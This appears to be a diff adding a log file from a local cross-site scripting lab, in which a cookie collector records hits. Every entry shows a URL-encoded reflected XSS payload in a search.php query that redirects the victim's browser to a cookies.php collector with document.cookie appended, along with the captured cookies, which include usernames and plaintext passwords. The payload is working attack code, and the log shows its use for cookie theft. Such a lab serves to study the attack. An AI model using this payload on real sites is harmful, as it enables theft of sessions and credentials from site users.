@@ -1,0 +1,11 @@
+
+IP: ::1 | PORT: 55274 |  Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 | METHOD: GET | REF: http://localhost/z/search.php?search=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Flocalhost%2Fxss%2Fcookies.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&Submit=Search |  DATE: Friday 14th 2018f September 2018 02:55:10 AM | COOKIE:  cookie=username=Petra;%20password=Uuohjreog 
+
+IP: ::1 | PORT: 55283 |  Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 | METHOD: GET | REF: http://localhost/z/search.php?search=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Flocalhost%2Fxss%2Fcookies.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&Submit=Search |  DATE: Friday 14th 2018f September 2018 03:01:32 AM | COOKIE:  cookie=username=Petra;%20password=Uuohjreog 
+
+IP: ::1 | PORT: 55286 |  Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 | METHOD: GET | REF: http://localhost/z/search.php?search=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Flocalhost%2Fxss%2Fcookies.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&Submit=Search |  DATE: Friday 14th 2018f September 2018 03:03:15 AM | COOKIE:  cookie=username=Petra;%20password=Uuohjreog 
+
+IP: ::1 | PORT: 55301 |  Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 | METHOD: GET | REF: http://localhost/z/search.php?search=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Flocalhost%2Fxss%2Fcookies.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&Submit=Search |  DATE: Friday 14th 2018f September 2018 03:10:01 AM | COOKIE:  cookie=username=Petra;%20password=Uuohjreog 
+
+IP: ::1 | PORT: 54689 |  Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 | METHOD: GET | REF: http://localhost/z/search.php?search=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Flocalhost%2Fxss%2Fcookies.php%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E&Submit=Search |  DATE: Sunday 16th 2018f September 2018 10:19:42 PM | COOKIE:  cookie=username=Hello;%20password=ibiubuh 
+
